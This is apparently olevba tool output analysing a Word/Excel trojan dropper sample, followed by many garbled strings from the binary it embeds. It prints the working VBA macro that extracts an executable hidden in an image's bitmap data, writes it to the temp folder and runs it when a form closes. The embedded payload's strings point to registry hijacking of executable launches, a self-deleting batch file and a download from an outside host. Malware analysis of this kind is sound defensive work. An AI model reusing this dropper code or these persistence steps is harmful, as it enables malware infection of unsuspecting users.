olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Trojan-Dropper.MSWord.Agent.c
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ЭтаКнига.cls 
in file: ./Trojan-Dropper.MSWord.Agent.c - OLE stream: '_VBA_PROJECT_CUR/VBA/ЭтаКнига'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Workbook_Open()
ActiveSheet.Cells(14, 4) = ""
ActiveSheet.Cells(15, 4) = ""
ActiveSheet.Cells(16, 4) = ""
ActiveSheet.Cells(17, 4) = ""
ActiveSheet.Cells(1, 1) = ""
End Sub
-------------------------------------------------------------------------------
VBA MACRO Лист1.cls 
in file: ./Trojan-Dropper.MSWord.Agent.c - OLE stream: '_VBA_PROJECT_CUR/VBA/Лист1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub CommandButton1_Click()
  UserForm1.Show
End Sub
-------------------------------------------------------------------------------
VBA MACRO Лист2.cls 
in file: ./Trojan-Dropper.MSWord.Agent.c - OLE stream: '_VBA_PROJECT_CUR/VBA/Лист2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Лист3.cls 
in file: ./Trojan-Dropper.MSWord.Agent.c - OLE stream: '_VBA_PROJECT_CUR/VBA/Лист3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO UserForm1.frm 
in file: ./Trojan-Dropper.MSWord.Agent.c - OLE stream: '_VBA_PROJECT_CUR/VBA/UserForm1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Option Explicit
Private Declare Function GetBitmapBits Lib "Gdi32.dll" ( _
    ByVal hBitmap As Long, _
    ByVal cbBuffer As Long, _
    lpBits As Any) As Long
    
Private Declare Function ShellExecute Lib "Shell32.dll" _
  Alias "ShellExecuteA" _
  (ByVal hWnd As Long, _
  ByVal lpOperation As Long, _
  ByVal lpFile As String, _
  ByVal lpParameters As Long, _
  ByVal lpDirectory As Long, _
  ByVal nShowCmd As Integer) As Long
   
Private Declare Function GetTempPath Lib "kernel32" _
  Alias "GetTempPathA" _
  (ByVal nBufferLength As Long, _
  ByVal lpBuffer As String) As Long
  
Private Declare Function GetTempFileName Lib "kernel32" _
  Alias "GetTempFileNameA" _
  (ByVal lpszPath As String, _
  ByVal lpPrefixString As String, _
  ByVal wUnique As Long, _
  ByVal lpTempFileName As String) As Long
Function CreateTempFileName(strPrefix As String) As String
  Const MAX_PATH = 2048
  Dim strPath As String
  Dim strBuffer As String
  Dim cntBytes As Long
  Dim err As Long
  Dim cntLen As Integer
  
  strBuffer = Space(MAX_PATH)
  cntBytes = GetTempPath(Len(strBuffer), strBuffer)
  If cntBytes > 0 Then
    strPath = Left(strBuffer, cntBytes)
    CreateTempFileName = strPath & "\" & strPrefix & ".exe"
  End If
End Function

Private Sub LoadAndRun()
  Dim DataSize As Long
  Dim i As Long
  Dim hBitmap As Long
  
  '!!!!! вставить длину ехе файла в даном случае 8250 !!!!!
  Dim buffer(1 To 8250) As Byte
  
  Dim cbCopiedBits As Long
  
  Dim FileName As String
  Dim RetCode As Long
  Dim hExeFile As Long
  On Error GoTo Label1
'  FileName = "c:\!\new2.exe"
  FileName = CreateTempFileName("demo2")
  
  '!!!!! вставить длину ехе файла в даном случае 8250 !!!!!
  DataSize = 8250
  
  hBitmap = Image8.Picture.handle
  cbCopiedBits = GetBitmapBits(hBitmap, DataSize, buffer(1))
    
  hExeFile = FreeFile
  Open FileName For Binary Access Write Shared As hExeFile
'  Put hExeFile, DataSize, buffer
  For i = 1 To DataSize
    Put hExeFile, , buffer(i)
  Next i
  Close hExeFile
  Call ShellExecute(0, 0, FileName, 0, 0, 1)
Label1:
End Sub


Private Sub Frame3_Click()

End Sub

Private Sub MultiPage1_Change()

End Sub

Private Sub UserForm_Click()

End Sub

Private Sub UserForm_Terminate()

Call LoadAndRun

End Sub
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     18 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - 8
' 0085     18 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - 8
' 0085     18 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - 8
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Tab4
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Tab5
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Tab6
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Tab7
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahomab7
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
K�Qlt
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������������������������������������������������������������������������㏏�����|<
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��㏏�����
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����8xq���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
q��ǎ8�q���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����p
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Î8�1���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����0
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��8�0
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��p����8
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��x���F8����
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��x���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
8����
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
~8���x���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
x����
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
<8���x�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
K�Qlt
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�	�!�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
L�!This program cannot be run in DOS mode.
$
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=3�,$3
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=3Rich
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
.text
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�.data
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Software\Microsoft\WAP
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
RegisterServiceProcess
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
KERNEL32.DLL
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
demo_family_2.0
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
\shell\open\command
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Software\CLASSES\
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
exefile
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
@echo off
:Repeat1
del %s
if exist %s goto Repeat1
del %s

-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
tmp.bat
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
\System
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
proba115
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 "%1" %*
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
NoSplash
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
SOFTWARE\Policies\Microsoft\Internet Explorer\Infodelivery\Restrictions
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
chernik890.msk.ru/services.txt
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
services.exe
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�O��n
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
F%D,3�&�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��l0@
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���0@
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��X0@
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��x0@
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��\0@
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��h0@
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��|0@
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���0@
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��p0@
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���0@
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
át0@
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����Ћ���t&Wh
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����t
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
P��V�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
_^áx0@
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����Ѕ���0@
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�U��Q�e�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�E�P�|0@
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����U���T�E�P��0@
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����ЍE�P�E�P3�PPPPPP�u
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
P�p0@
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����U���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����Yt%hT
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3��NV�u
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
W�օ�u
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3��8h<
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
W�օ�t��E
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
P�}�E��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
@�E��E�P�]

-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��Yt�W�*

-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3�Y@^_��U��QQ�e�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
V�E��u��u
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
P�P�����YYt��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��u�@^��3���U���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
SVW�u
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�׋؍
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����YtLSV�u
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��t;�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�E�E
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3�CV�]�E�u���@�E��E�P�	
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�]�V�q	
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�E�Y_^[��U���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�b���Y�?��
